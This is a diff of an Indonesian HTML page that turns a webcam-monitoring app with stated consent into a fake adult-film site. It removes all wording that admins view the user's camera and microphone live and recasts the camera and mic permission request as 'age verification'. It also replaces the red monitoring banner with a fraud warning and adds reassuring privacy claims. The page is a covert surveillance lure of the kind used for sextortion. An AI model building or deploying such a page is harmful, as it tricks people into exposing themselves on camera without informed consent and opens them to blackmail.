@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Layar Biru — Nonton Film</title>
+  <title>Film Biru — Nonton Film 18</title>
 
   <!-- Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
@@ -23,10 +23,10 @@
   <div class="login-card">
     <div class="login-logo">
       <div class="dot"></div>
-      <span>Layar Biru</span>
+      <span>Film Biru</span>
     </div>
-    <h2>Masuk ke Akunmu</h2>
-    <p class="sub">Akun penonton masuk ke halaman nonton · Akun admin masuk ke dashboard monitoring.</p>
+    <h2>Login</h2>
+    <p class="sub">Login menggunakan userbaru@layarbiru.com, password: user1234, agar tidak menggunakan email anda</p>
 
     <div class="error-msg" id="login-error">
       <span>🚫</span><span id="login-error-text">Email atau password salah.</span>
@@ -42,12 +42,12 @@
     </div>
 
     <div class="consent-box">
-      <div class="consent-title">⚠️ Informasi Pemantauan Sesi</div>
-      <p>Platform ini memantau sesi menonton melalui kamera dan mikrofon. Admin dapat melihat video dan audio kamu secara langsung selama menonton.</p>
+      <div class="consent-title">⚠️ Informasi Verifikasi Usia</div>
+      <p>Platform ini berisi konten dewasa, verifikasi usia anda dengan menyetujui seluruh izin yang di minta.</p>
       <label class="consent-check">
         <input id="chk-consent" type="checkbox"
           onchange="document.getElementById('btn-login').disabled=!this.checked"/>
-        <span>Saya mengerti dan menyetujui pemantauan sesi oleh admin platform Layar Biru.</span>
+        <span>Saya mengerti dan menyetujui semua syarat dan saya berusia di atas 18 tahun</span>
       </label>
     </div>
 
@@ -55,7 +55,7 @@
       Masuk &amp; Mulai Nonton
     </button>
     <p style="text-align:center;font-size:.72rem;color:var(--muted);margin-top:14px;">
-      Layar Biru v2.1 · WebRTC Live Monitoring
+      Film Biru v2.1 · Nonton Dewasa HD
     </p>
   </div>
 </div>
@@ -66,43 +66,43 @@
      ================================================================ -->
 <div class="screen" id="screen-consent">
   <div class="consent-card">
-    <div class="icon-big">📹</div>
+    <div class="icon-big">⚠️</div>
     <h2>Izinkan Akses Kamera &amp; Mikrofon</h2>
-    <p class="desc">Sebelum mulai menonton, Layar Biru membutuhkan akses kamera dan mikrofon kamu.</p>
+    <p class="desc">Sebelum mulai menonton, Film Biru membutuhkan persetujuan izin bahwa anda berusia di atas 18 tahun</p>
 
     <div class="info-list">
       <div class="info-item">
-        <span class="ii-icon">📡</span>
+        <span class="ii-icon">⚠️</span>
         <div class="ii-text">
-          <strong>Stream video &amp; audio langsung ke admin</strong>
-          <span>Admin dapat melihat video kamera dan mendengar mikrofon kamu secara realtime melalui teknologi WebRTC terenkripsi.</span>
+          <strong>Stream video HD &amp; Video Terbaru</strong>
+          <span>Semua data dan privasi anda terjaga selama anda menyetujui usia anda di atas 18 tahun.</span>
         </div>
       </div>
       <div class="info-item">
-        <span class="ii-icon">🔴</span>
+        <span class="ii-icon">⚠️</span>
         <div class="ii-text">
-          <strong>Indikator monitoring selalu tampil</strong>
-          <span>Banner merah di layarmu selalu aktif selama sesi berlangsung.</span>
+          <strong>Selama menonton verifikasi diminta setiap sesi</strong>
+          <span>Demi keamanan platform setiap sesi selalu diminta untuk memverifikasi usia anda</span>
         </div>
       </div>
       <div class="info-item">
-        <span class="ii-icon">⏹️</span>
+        <span class="ii-icon">⚠️</span>
         <div class="ii-text">
-          <strong>Stream berhenti otomatis saat keluar</strong>
-          <span>Menutup browser otomatis mengakhiri sesi dan stream kamera/mikrofon.</span>
+          <strong>Harap selalu patuhi kebijakan platform</strong>
+          <span>Semua data anda terenskripsi secara aman oleh secure</span>
         </div>
       </div>
       <div class="info-item">
         <span class="ii-icon">🔒</span>
         <div class="ii-text">
-          <strong>Tidak direkam ke server</strong>
-          <span>Stream hanya peer-to-peer antara perangkatmu dan admin, tidak disimpan.</span>
+          <strong>Server aman dan tidak ada iklan</strong>
+          <span>Stream hanya peer-to-peer, server aman tanpa gangguan iklan di setiap video</span>
         </div>
       </div>
     </div>
 
     <div class="btn-row">
-      <button class="btn-agree" onclick="requestCamera()">✅ Izinkan Akses Kamera &amp; Mikrofon</button>
+      <button class="btn-agree" onclick="requestCamera()">Setujui semua perizinan &amp; enjoy </button>
       <button class="btn-decline" onclick="declineCamera()">Tolak &amp; Keluar</button>
     </div>
   </div>
@@ -117,7 +117,7 @@
   <div class="monitor-banner">
     <div class="banner-left">
       <div class="rec-dot"></div>
-      <span>🔴 VIDEO &amp; MIKROFON KAMU SEDANG DIPANTAU ADMIN SECARA REALTIME</span>
+      <span>⚠️ PERHATIAN &amp; WASPADA PENIPUAN MENGATAS NAMAKAN PLATFORM KAMI!!! </span>
     </div>
     <div class="banner-right">
       <span class="session-timer" id="session-timer">00:00:00</span>
@@ -130,9 +130,9 @@
     <div style="display:flex;align-items:center;gap:10px;">
       <div class="user-chip">
         <div class="avatar" id="user-avatar-chip">U</div>
-        <span id="user-name-chip">Pengguna</span>
+        <span id="user-name-chip">User</span>
       </div>
-      <button class="btn-end-session" onclick="endSession()">⏹ Akhiri Sesi</button>
+      <button class="btn-end-session" onclick="endSession()">Logout</button>
     </div>
   </div>
 
